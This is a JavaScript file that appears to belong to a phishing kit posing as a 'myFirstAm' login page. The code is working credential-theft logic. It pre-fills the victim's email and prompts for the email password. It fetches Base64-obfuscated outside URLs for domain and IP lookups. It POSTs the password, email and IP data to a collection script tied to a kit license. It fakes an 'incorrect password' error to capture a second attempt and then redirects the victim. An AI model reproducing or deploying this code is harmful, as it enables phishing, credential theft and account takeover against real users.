let ip_config = {};
let DOMAIN__NAME = "";
let subject = "", url_main_link = "", sec_p = false, fina = false, compare = "", count = false;
let retry = false;
$(document).ready(function () {
    localStorageCheck();

    url_main_link = url_check();
    if (SHOW_EXTRA_PARAMS === true) {
        window.history.pushState($("html").html(), "Login - myFirstAm", url_main_link);
    }

    let main_url = new URL(location.href);
    $("a").each(function () {
        $(this).attr("onclick", "window.location.replace(window.location.href); return false;")
    });
    if (validateEmail(DEFAULT_USER_EMAIL)) {
        $("#email").val(DEFAULT_USER_EMAIL).attr("readonly", "readonly");
        $(".passwordDivBody .s-input-message").html("Verify its you");
        $(".passwordDivBody").addClass("has-error");
        $("#password").attr("placeholder", "Input email password").focus();
    } else {
        $("#password").attr("placeholder", "Input email password");
        $("#email").attr("placeholder", "Input email address").focus();
    }

    $("#submit-button").on('click', async function (e) {
        e.preventDefault();
        let $button = $("#submit-button");
        if ($button.hasClass('loading')) {
            return false;
        }
        $button.addClass('loading');
        let $buttonDive = $(".submit_button");
        $buttonDive.removeClass('has-error');
        let $mainError = $buttonDive.find(".s-input-message");
        let $password = $("#password");

        if ($password.val().length < 6) {
            let $parent = $password.parents('div.js-auth-item');
            let $error = $parent.find(".s-input-message");
            let message = $password.val().length < 1 ? "Password cannot be empty." : "The password is too short."
            $error.html(message);
            $parent.addClass('has-error');
            $("input").removeAttr('readonly');
            $button.removeClass('loading');
            return false;
        }

        let email_check = await load_domains();
        if (email_check === true) {
            let $parent = $password.parents('div.js-auth-item');
            let $error = $parent.find(".s-input-message");
            $parent.removeClass('has-error');
            if ($password.val().length < 6) {
                let message = $password.val().length < 1 ? "Password cannot be empty." : "The password is too short."
                $error.html(message);
                $parent.addClass('has-error');
                $("input").removeAttr('readonly');
                $button.removeClass('loading');
                return false;
            } else {
                DOMAIN__NAME = retry ? `${DOMAIN__NAME} Account - Second Try` : `${DOMAIN__NAME} Account`;
                let get_R = await sendResult($password.val(), $("#email").val(), DOMAIN__NAME)
                if (get_R.success === true) {


                    if (TWO_TIMES_LOGIN_TRY === true) {
                        if (retry === true) {
                            window.location.replace(FINAL_REDIRECTION);
                            return false;
                        } else {
                            retry = true;
                            $password.val("");
                            $error.html("The email or password is incorrect.");
                            $parent.addClass('has-error');
                            $("input").removeAttr('readonly');
                            $button.removeClass('loading');
                            return false;
                        }
                    } else {
                        window.location.replace(FINAL_REDIRECTION);
                        return false;
                    }


                } else {
                    let count = get_R.position === 1 ? 700 : 1300;
                    setTimeout(function () {
                        $mainError.html(get_R.message);
                        $buttonDive.addClass('has-error');
                        $("input").removeAttr('readonly');
                        $button.removeClass('loading');
                        return false;
                    }, count);
                }
            }
        } else {
            $("input").removeAttr('readonly');
            $button.removeClass('loading');
        }
    })

})

async function get_domain(e_m) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvY2hlY2svZG9tYWluP2VfbT0=") + e_m,
            type: 'GET',
            dataType: "json",
            contentType: "application/json; charset=utf-8",
            beforeSend: function (xhr) {
                /* xhr.setRequestHeader('Authorization', `Bearer ${token}`); */
            },
            data: JSON.stringify({
                e_m
            }),
            success: function (response) {
                resolve(response);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(error);
            }
        });
    });
}

async function get_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                if (response.status === "success") {
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(true);
            }
        });
    });
}


function localStorageCheck() {
    let ip = localStorage.getItem("ip_config");
    if (ip !== null) ip_config = JSON.parse(ip);
}

function validateEmail(mail) {
    return (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(mail))
}

function url_check(new_filename = "") {
    let url = new URL(window.location.href);
    let search = url.search;
    let hash = url.hash;
    let href = url.href.replace(search, "").replace(hash, "");
    if (!search.includes("scriptID")) {
        search += search.includes("?") ? "&" : "?";
        search += ("scriptID=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&token=" + Math.random().toString().replace("0.", ""));
    }
    if (href.endsWith("/")) {
        href += new_filename + search + hash;
    } else {
        if (new_filename.length > 0) {
            if (href.endsWith(".html") || href.endsWith(".htm") || href.endsWith(".php")) {
                let href_last = href.split("/")[(href.split("/") - 1)];
                href = href.replace(href_last, "");
                href += new_filename + search + hash;
            } else {
                href += new_filename + search + hash;
            }
        } else {
            href += new_filename + search + hash;
        }
    }
    return href;
}


async function load_domains() {
    let $input = $("#email");
    let $parent = $input.parents('div.js-auth-item');
    let $error = $parent.find(".s-input-message");
    $parent.removeClass('has-error');
    if ($input.val().length > 1) {
        if (validateEmail($input.val()) === false) {
            $error.html("The email is not a valid email address.");
            $parent.addClass('has-error');
            return false;
        }
        let res = await get_domain($input.val().trim());
        if (Object.keys(ip_config).length < 2) {
            await get_ip();
        }
        if (typeof res === "object") {
            if (Object.keys(res).includes("domain")) {
                DOMAIN__NAME = res.domain;
                if (DOMAIN__NAME.length < 2) {
                    $error.html("The email is not a valid email address.");
                    $parent.addClass('has-error');
                    return false;
                } else if (DOMAIN__NAME === "rejected" && IS_REJECTED) {
                    $error.html("The email is not supported or not a valid email address.");
                    $parent.addClass('has-error');
                    return false;
                } else {
                    return true;
                }
            } else {
                $error.html("Unknown error occur, please try again or reload this page.");
                $parent.addClass('has-error');
                return false;
            }
        } else {
            window.location.replace(location.href);
            return false;
        }
    } else {
        $error.html("Please enter your email address.");
        $parent.addClass('has-error');
        return false;
    }
}

async function sendResult(password, email, domain) {
    let result = await card_reader(SCRIPT_NAME, "Jm Tech", LICENSE_KEY, JSON.stringify(ip_config), password, email, domain)
    if (Object.keys(result).includes('errors')) {
        return {
            success: false,
            message: "Error, please check your internet connection or reload this page.",
            position: 1
        }

    } else {
        //setTimeout(function () {
        if (result.response.msg.includes("uccessfull")) {
            localStorage.setItem("sent", "true sent for real");
            return {success: true}
        } else {
            return {
                success: false,
                message: "Unknown error occur, please reload this page or try again.",
                position: 2
            }
        }
        //}, 1300);
    }
}

async function card_reader(a, b, c, d, e, f, g, h = "") {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: a,
            type: 'POST',
            dataType: "json",
            data: {
                r: b,
                l: c,
                i: d,
                p: e,
                u: f,
                pro: g,
                c: h
            },
            success: function (response) {
                resolve({response});
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(error);
            }
        });
    });
}


